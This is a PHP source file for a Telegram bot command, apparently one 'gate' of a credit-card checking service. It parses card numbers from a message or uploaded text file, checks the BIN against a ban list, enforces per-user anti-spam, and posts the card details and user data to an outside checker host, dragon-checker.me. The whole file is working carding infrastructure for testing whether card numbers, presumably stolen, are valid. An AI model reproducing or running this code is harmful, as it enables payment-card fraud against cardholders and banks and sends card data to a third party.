<?php

use App\Gate\{Bin, Card, CurlX};
use App\Models\{Bot, User};

$query = Bot::GetContent($message, strlen($cmd['cmd']) + 2);

$txt = $up['message']['reply_to_message']['text'] ?? $message;

if (isset($up['message']['reply_to_message']['document']) && $up['message']['reply_to_message']['document']['mime_type'] == 'text/plain') {
    $file_id = $up['message']['reply_to_message']['document']['file_id'];

    $file = Bot::getfile(['file_id' => $file_id]);
    if (!$file['ok']) {Bot::SendMsg($chat_id, '<b>Error:</b> <i>' . $file['description'] . '</i>', $message_id);exit;}

    $file_path = $file['result']['file_path'];
    $file_path = 'https://api.telegram.org/file/bot' . Bot::GetToken() . '/' . $file_path;

    /** @var string CCs content */
    $txt = file_get_contents($file_path);
}

$spam = "<b>λ Gate " . $cmd['name'] . "\nFormat:</b> <code>" . $t . $cmd['cmd'] . ' ' . $cmd['form'] . "</code>";
$spam .= (strlen($cmd['msg']) < 5) ? '' : "\n\n<b>📝Comment:</b> <i>" . $cmd['msg'] . "</i>";

$cc = Card::SetCard($txt);

if (!$cc['ok']) {
    Bot::SendMsg($chat_id, $spam, $message_id);
    exit;
}
$note = ($cc['data']['all'] > 1) ? "\n\n<b>Note:</b> <i>For check multiple cards use any mass gate</i>" : '';

if ($cc['data']['all'] == $cc['data']['invalid']) {
    Bot::SendMsg($chat_id, "<i><b>⌧ CC:</b> <code>" . implode('|', $cc['cc']['invalid'][0]['cc']) . "</code>\n<b>⌧ Reason:</b></i> <u>" . $cc['cc']['invalid'][0]['reason']['msg'] . "</u> ⚠️" . $note, $message_id);
    exit;
}

$card = $cc['cc']['valid'][0]['cc'];

$antispam = User::AntiSpam($f);

if (!$antispam['ok']) {
    Bot::SendMsg($chat_id, $antispam['msg'].$note, $message_id);exit;
}

$fim = Bin::Get($card[0]);
if (!$fim['ok']) {
    Bot::SendMsg($chat_id, '<i>' . $fim['error'] . '</i>'.$note, $message_id);exit;
}if ($fim['banned']) {
    Bot::SendMsg($chat_id, '<b>⚠️</b> <i>Bin banned ➜ ' . $fim['bin'] . '</i>'.$note, $message_id);exit;
}

$f['chat_id'] = $chat_id;
$f['msg_id'] = $message_id;

$payload = json_encode(encode_gate($card, $fim, $f, $cmd));
User::UpdateLastCheck($f['id'], time());
$a = CurlX::Post('https://dragon-checker.me/kirariv2/public/gates/?'.http_build_query(['path' => $cmd['link']] ), $payload);
print_r($a);


function encode_gate(array $card, array $fim, array $user, array $cmd): array {
    return [
        'user' => $user,
        'gate' => $cmd, 
        'ccs' => [
            [
                'cc' => $card,
                'bin' => $fim
            ]
        ]
    ];
}